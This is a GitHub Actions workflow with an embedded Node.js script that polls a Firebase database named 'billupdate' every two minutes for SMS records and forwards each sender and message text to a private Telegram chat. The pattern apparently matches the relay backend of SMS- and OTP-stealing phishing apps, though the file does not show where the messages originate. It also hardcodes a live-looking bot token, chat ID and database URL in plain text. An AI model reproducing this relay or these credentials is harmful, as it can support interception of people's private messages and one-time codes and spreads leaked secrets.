name: SMS to Telegram

on:
  schedule:
    - cron: '*/2 * * * *'  # Har 2 minute me
  workflow_dispatch:

jobs:
  check-sms:
    runs-on: ubuntu-latest
    
    steps:
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '20'  # âœ… Node 20 use karein
      
      - name: Install dependencies
        run: npm install axios
      
      - name: Run SMS Checker
        env:
          FIREBASE_URL: 'https://billupdate-2c426-default-rtdb.asia-southeast1.firebasedatabase.app'
          BOT_TOKEN: '8201318151:AAGelxS1S7B9Zj9Ck9qd5UeK8Kv0573I18Y'
          CHAT_ID: '8194289567'
        run: |
          cat > check.js << 'EOF'
          const axios = require('axios');
          
          const FIREBASE_URL = process.env.FIREBASE_URL;
          const BOT_TOKEN = process.env.BOT_TOKEN;
          const CHAT_ID = process.env.CHAT_ID;
          
          console.log('ðŸš€ Starting SMS checker...');
          
          async function checkSMS() {
            try {
              console.log('ðŸ” Fetching messages from Firebase...');
              
              // Get messages where telegram_sent is null
              const response = await axios.get(`${FIREBASE_URL}/messages.json?orderBy="telegram_sent"&equalTo=null&limitToLast=5`);
              
              console.log('ðŸ“Š Firebase response status:', response.status);
              
              if (response.data && typeof response.data === 'object') {
                const messages = response.data;
                const messageCount = Object.keys(messages).length;
                
                console.log(`âœ… Found ${messageCount} new message(s)`);
                
                for (const [msgId, msg] of Object.entries(messages)) {
                  if (msg && msg.sender && msg.message) {
                    console.log(`ðŸ“± Processing: ${msgId}`);
                    
                    try {
                      // Format Telegram message
                      const telegramMsg = `ðŸš¨ *NEW SMS*\\nðŸ“ž From: ${msg.sender}\\nðŸ“ Message: ${msg.message}\\nðŸ†” ID: ${msgId}`;
                      
                      // Send to Telegram
                      console.log('ðŸ“¤ Sending to Telegram...');
                      const telegramResponse = await axios.post(
                        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                        {
                          chat_id: CHAT_ID,
                          text: telegramMsg,
                          parse_mode: 'Markdown'
                        }
                      );
                      
                      console.log('âœ… Telegram response:', telegramResponse.status);
                      
                      // Mark as sent in Firebase
                      console.log('ðŸ“ Updating Firebase...');
                      await axios.patch(`${FIREBASE_URL}/messages/${msgId}.json`, {
                        telegram_sent: true,
                        sent_at: Date.now(),
                        sent_via: 'github_actions'
                      });
                      
                      console.log(`ðŸŽ‰ Successfully processed: ${msgId}`);
                      
                    } catch (error) {
                      console.error(`âŒ Error processing ${msgId}:`, error.message);
                    }
                  }
                }
              } else {
                console.log('ðŸ“­ No new messages found');
              }
              
            } catch (error) {
              console.error('ðŸ”¥ Main error:', error.message);
              if (error.response) {
                console.error('Response status:', error.response.status);
                console.error('Response data:', JSON.stringify(error.response.data, null, 2));
              }
            }
          }
          
          checkSMS();
          EOF
          
          echo "ðŸ“ Running JavaScript file..."
          node check.js
          echo "âœ… Script execution completed"
